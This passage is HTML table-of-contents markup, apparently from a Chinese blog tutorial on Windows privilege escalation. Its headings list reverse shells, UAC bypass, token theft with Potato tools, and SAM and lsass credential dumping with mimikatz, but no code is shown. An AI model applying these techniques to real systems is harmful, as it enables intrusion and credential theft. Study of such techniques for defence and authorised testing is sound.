class="toc-text">3.注册表权限弱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%8F%AF%E6%89%A7%E8%A1%8C"><span class="toc-text">4.不安全的服务可执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-msf%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97"><span class="toc-text">5.msf攻击模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-text">注册表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%98%AF%E4%B8%80%E4%B8%AA%E5%BA%9E%E5%A4%A7%E7%9A%84%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%8C%E5%AD%98%E5%82%A8%E4%BA%86%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E3%80%82%E7%94%B1%E4%BA%8E%E5%85%B6%E9%87%8D%E8%A6%81%E6%80%A7%EF%BC%8C%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%BB%8F%E5%B8%B8%E6%88%90%E4%B8%BA%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E7%9B%AE%E6%A0%87%E3%80%82"><span class="toc-text">Windows 注册表是一个庞大的配置数据库，存储了系统和应用程序的配置信息。由于其重要性，注册表中的漏洞经常成为攻击者的目标。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%87%AA%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-text">1 自启动项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%9A%84-ImagePath"><span class="toc-text">2 服务配置中的 ImagePath</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-AlwaysInstallElevated"><span class="toc-text">3 AlwaysInstallElevated</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%85%B7%E6%9C%89%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-text">创建一个具有管理员权限的用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-text">提取敏感信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-PowerShell-%E8%84%9A%E6%9C%AC"><span class="toc-text">运行 PowerShell 脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E6%9D%83%E9%99%90"><span class="toc-text">4 注册表键权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%AE%9A%E4%B9%89%E8%AF%AD%E8%A8%80%EF%BC%88SDDL%EF%BC%89"><span class="toc-text">5 安全描述符定义语言（SDDL）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="toc-text">6 环境变量劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%92%A9%E5%AD%90"><span class="toc-text">7 注册表钩子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-AppInit-DLLs-%E6%B3%A8%E5%85%A5"><span class="toc-text">8 AppInit_DLLs 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E5%90%AF%E5%8A%A8%E4%B8%8E%E6%81%A2%E5%A4%8D%E8%AE%BE%E7%BD%AE"><span class="toc-text">9 启动与恢复设置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5"><span class="toc-text">组策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9"><span class="toc-text">组策略首选项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87UAC"><span class="toc-text">绕过UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-text">1.白名单</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E6%89%BE%E5%87%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E7%A8%8B%E5%BA%8F%E3%80%82"><span class="toc-text">首先使用工具找出白名单的程序。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-DDL%E5%8A%AB%E6%8C%81"><span class="toc-text">2.DDL劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%A8%A1%E6%8B%9F%E5%8F%AF%E4%BF%A1%E4%BB%BB%E7%9B%AE%E5%BD%95"><span class="toc-text">3.模拟可信任目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-MSF%E4%B8%8B%E7%9A%84Bypass"><span class="toc-text">4.MSF下的Bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-text">令牌窃取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%9B%B4%E6%8E%A5%E5%81%B7"><span class="toc-text">1.直接偷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-MSF%E5%81%B7"><span class="toc-text">2.MSF偷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Potato%E6%8F%90%E6%9D%83"><span class="toc-text">3.Potato提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Hot-Potato"><span class="toc-text">Hot Potato</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Juicy-Potato"><span class="toc-text">Juicy Potato.</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-BITS-%E5%92%8C-CLSID%EF%BC%9F"><span class="toc-text">什么是 BITS 和 CLSID？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%99%E4%BA%9B%E5%9B%A0%E7%B4%A0%E7%9B%B4%E6%8E%A5%E5%BD%B1%E5%93%8D%E4%BD%A0%E8%83%BD%E5%90%A6%E6%89%BE%E5%88%B0%E5%8F%AF%E7%94%A8%E7%9A%84-CLSID%EF%BC%8C%E6%98%AF%E6%95%B4%E4%B8%AA%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E5%85%B3%E9%94%AE%E7%8E%AF%E8%8A%82%E3%80%82"><span class="toc-text">这些因素直接影响你能否找到可用的 CLSID，是整个利用过程中的关键环节。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%8F%82%E6%95%B0%E5%AF%B9%E5%BA%94%E5%85%B3%E7%B3%BB"><span class="toc-text">利用流程与参数对应关系</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rotten-Potato-%E7%83%82%E5%9C%9F%E8%B1%86"><span class="toc-text">Rotten Potato(烂土豆)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rogue-Patato"><span class="toc-text">Rogue Patato</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SweetPotato"><span class="toc-text">SweetPotato</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GodPotato"><span class="toc-text">GodPotato</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PrintSpoofer"><span class="toc-text">PrintSpoofer</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%B3%95-1%EF%BC%9A%E5%90%AF%E5%8A%A8%E4%B8%80%E4%B8%AA-SYSTEM-%E8%BF%9B%E7%A8%8B%E5%B9%B6%E4%B8%8E%E4%B9%8B%E4%BA%A4%E4%BA%92"><span class="toc-text">用法 1：启动一个 SYSTEM 进程并与之交互</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%B3%95-2%EF%BC%9A%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AA-SYSTEM-%E8%BF%9B%E7%A8%8B%E5%B9%B6%E9%80%80%E5%87%BA"><span class="toc-text">用法 2：生成一个 SYSTEM 进程并退出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%B3%95-3%EF%BC%9A%E5%9C%A8%E6%A1%8C%E9%9D%A2%E4%B8%8A%E5%90%AF%E5%8A%A8-SYSTEM-%E8%BF%9B%E7%A8%8B"><span class="toc-text">用法 3：在桌面上启动 SYSTEM 进程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81"><span class="toc-text">密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8-1"><span class="toc-text">注册表</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%A4%84%E7%9A%84%E5%AF%86%E7%A0%81-%E6%89%8B%E5%B7%A5-winPEAS"><span class="toc-text">搜索注册表处的密码(手工&#x2F;winPEAS)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%AD%E8%AF%81"><span class="toc-text">凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">配置文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">搜索配置文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SAM"><span class="toc-text">SAM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E4%B8%8B%E7%9A%84hash%E5%AF%86%E7%A0%81%E6%A0%BC%E5%BC%8F"><span class="toc-text">Windows系统下的hash密码格式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87SAM%E6%96%87%E4%BB%B6-mimikatz%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-text">通过SAM文件+mimikatz读取密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E4%BF%A1%E7%94%A8%E5%A5%97%E4%BB%B6%EF%BC%9A"><span class="toc-text">下载信用套件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E5%AF%B9SAM%E5%92%8C%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E7%9A%84%E5%B7%A5%E5%85%B7%E6%9D%A5%E6%8F%90%E5%8F%96%E5%93%88%E5%B8%8C%EF%BC%9A"><span class="toc-text"> 运行对SAM和系统文件的工具来提取哈希：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8hashcat%E7%A0%B4%E8%A7%A3%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%93%88%E5%B8%8C%EF%BC%9A"><span class="toc-text">使用hashcat破解管理员用户哈希：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8-Windows-%E8%BF%90%E8%A1%8C%E6%97%B6%EF%BC%8C%E6%96%87%E4%BB%B6%E5%B7%B2%E9%94%81%E5%AE%9A%E3%80%82"><span class="toc-text">在 Windows 运行时，文件已锁定。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#lsass-exe-%E8%BF%9B%E7%A8%8B"><span class="toc-text">lsass.exe 进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#procdump64-%E5%BE%AE%E8%BD%AF%E8%87%AA%E5%B7%B1%E7%9A%84%E5%B7%A5%E5%85%B7-mimikatz"><span class="toc-text">procdump64(微软自己的工具)+mimikatz</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Scheduled-Tasks"><span class="toc-text">Scheduled Tasks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%8A%E4%BB%A5%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E3%80%82"><span class="toc-text">查看计算机上以管理权限运行的计划任务。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-text">用户权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-text">列出用户权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeImpersonatePrivilege"><span class="toc-text">SeImpersonatePrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeAssignPrimaryPrivilege"><span class="toc-text">SeAssignPrimaryPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeAssignPrimaryPrivilege-1"><span class="toc-text">SeAssignPrimaryPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeBackupPrivilege"><span class="toc-text">SeBackupPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeRestorePrivilege"><span class="toc-text">SeRestorePrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeTakeOwnershipPrivilege"><span class="toc-text">SeTakeOwnershipPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%89%B9%E6%9D%83-%E6%9B%B4%E9%AB%98%E7%BA%A7"><span class="toc-text">其他特权(更高级)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%89%E7%B3%BB%E7%BB%9F%E7%B1%BB%E5%9E%8B"><span class="toc-text">按系统类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows2000-2003%E3%80%81XP"><span class="toc-text"> Windows2000&#x2F;2003、XP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#at%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-text">at本地命令提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#at-%E9%85%8D%E5%90%88-msf%E6%8F%90%E6%9D%83"><span class="toc-text">at 配合 msf提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-7-8%E3%80%8103-08%E3%80%8112-16"><span class="toc-text">windows 7&#x2F;8、03&#x2F;08、12&#x2F;16</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sc%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-text">sc命令提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AlwaysInstallElevated"><span class="toc-text">AlwaysInstallElevated</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unattended-Installs"><span class="toc-text">Unattended Installs</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-text">第三方软件漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql"><span class="toc-text">mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker"><span class="toc-text">docker</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%94%A8%E6%88%B7%E5%92%8C%E6%9D%83%E9%99%90%E6%A8%A1%E5%9E%8B"><span class="toc-text">1.用户和权限模型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%EF%BC%88User-Account%EF%BC%89%EF%BC%9AWindows-%E7%B3%BB%E7%BB%9F%E4%B8%AD%EF%BC%8C%E7%94%A8%E6%88%B7%E5%8F%AF%E4%BB%A5%E6%8B%A5%E6%9C%89%E4%B8%8D%E5%90%8C%E7%9A%84%E6%9D%83%E9%99%90%E5%92%8C%E8%A7%92%E8%89%B2%E3%80%82"><span class="toc-text">用户账户（User Account）：Windows 系统中，用户可以拥有不同的权限和角色。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8-ACL"><span class="toc-text">2.访问控制列表 (ACL)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6-SID"><span class="toc-text">3.安全标识符 (SID)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2-SID"><span class="toc-text">查询 SID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SID-%E8%A7%A3%E6%9E%90"><span class="toc-text">SID 解析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-text">4.基本命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">5.常用命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E5%8F%8D%E5%BC%B9shell-Win-192-168-129-161-KaLi-192-168-129-152"><span class="toc-text">Windows反弹shell  Win 192.168.129.161  KaLi  192.168.129.152</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#powercat"><span class="toc-text">powercat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nishang"><span class="toc-text">nishang</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89powershell%E5%87%BD%E6%95%B0%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">自定义powershell函数反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E5%8F%8D%E5%BC%B9"><span class="toc-text">MSF反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">python反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-text">Windows 内核溢出漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E6%89%8B%E5%B7%A5"><span class="toc-text">一：手工</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-msf%E8%87%AA%E5%8A%A8-%E5%8F%8D%E5%BC%B9shell%E5%90%8E"><span class="toc-text">二:msf自动(反弹shell后)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E7%9A%84%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83"><span class="toc-text">错误的系统配置提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-text">1.不安全的服务权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%AA%E5%BC%95%E7%94%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84"><span class="toc-text">2.未引用的服务路径</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%BF%90%E8%A1%8CwinPEAS%E4%BB%A5%E6%A3%80%E6%9F%A5%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%EF%BC%9A"><span class="toc-text">1.运行winPEAS以检查服务配置错误：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8F%91%E7%8E%B0%E2%80%9Dunquotedsvc%E2%80%9D%E6%9C%8D%E5%8A%A1%E6%9C%89%E4%B8%80%E4%B8%AA%E6%9C%AA%E5%BC%95%E7%94%A8%E7%9A%84%E8%B7%AF%E5%BE%84-%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%B9%9F-%E5%8C%85%E5%90%AB-%E7%A9%BA%E6%A0%BC%EF%BC%9A"><span class="toc-text">2. 发现”unquotedsvc”服务有一个未引用的路径 ，其中也 包含 空格：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8sc%E7%A1%AE%E8%AE%A4%E6%AD%A4%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-text">3. 使用sc确认此问题：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8accesschk-exe%E6%A3%80%E6%9F%A5%E5%86%99%E5%85%A5%E6%9D%83%E9%99%90%EF%BC%9A"><span class="toc-text">4.使用accesschk.exe检查写入权限：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E5%A4%8D%E5%88%B6%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8F%8D%E5%90%91%E5%A4%96%E5%A3%B3%E5%B9%B6%E9%80%82%E5%BD%93%E9%87%8D%E5%91%BD%E5%90%8D"><span class="toc-text">5.复制可执行的反向外壳并适当重命名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">6.启动服务触发漏洞进行反弹shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%83%E9%99%90%E5%BC%B1"><span class="toc-text">3.注册表权限弱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%8F%AF%E6%89%A7%E8%A1%8C"><span class="toc-text">4.不安全的服务可执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-msf%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97"><span class="toc-text">5.msf攻击模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-text">注册表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%98%AF%E4%B8%80%E4%B8%AA%E5%BA%9E%E5%A4%A7%E7%9A%84%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%8C%E5%AD%98%E5%82%A8%E4%BA%86%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E3%80%82%E7%94%B1%E4%BA%8E%E5%85%B6%E9%87%8D%E8%A6%81%E6%80%A7%EF%BC%8C%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%BB%8F%E5%B8%B8%E6%88%90%E4%B8%BA%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E7%9B%AE%E6%A0%87%E3%80%82"><span class="toc-text">Windows 注册表是一个庞大的配置数据库，存储了系统和应用程序的配置信息。由于其重要性，注册表中的漏洞经常成为攻击者的目标。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%87%AA%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-text">1 自启动项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%9A%84-ImagePath"><span class="toc-text">2 服务配置中的 ImagePath</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-AlwaysInstallElevated"><span class="toc-text">3 AlwaysInstallElevated</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%85%B7%E6%9C%89%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-text">创建一个具有管理员权限的用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-text">提取敏感信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-PowerShell-%E8%84%9A%E6%9C%AC"><span class="toc-text">运行 PowerShell 脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E6%9D%83%E9%99%90"><span class="toc-text">4 注册表键权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%AE%9A%E4%B9%89%E8%AF%AD%E8%A8%80%EF%BC%88SDDL%EF%BC%89"><span class="toc-text">5 安全描述符定义语言（SDDL）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="toc-text">6 环境变量劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%92%A9%E5%AD%90"><span class="toc-text">7 注册表钩子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-AppInit-DLLs-%E6%B3%A8%E5%85%A5"><span class="toc-text">8 AppInit_DLLs 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E5%90%AF%E5%8A%A8%E4%B8%8E%E6%81%A2%E5%A4%8D%E8%AE%BE%E7%BD%AE"><span class="toc-text">9 启动与恢复设置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 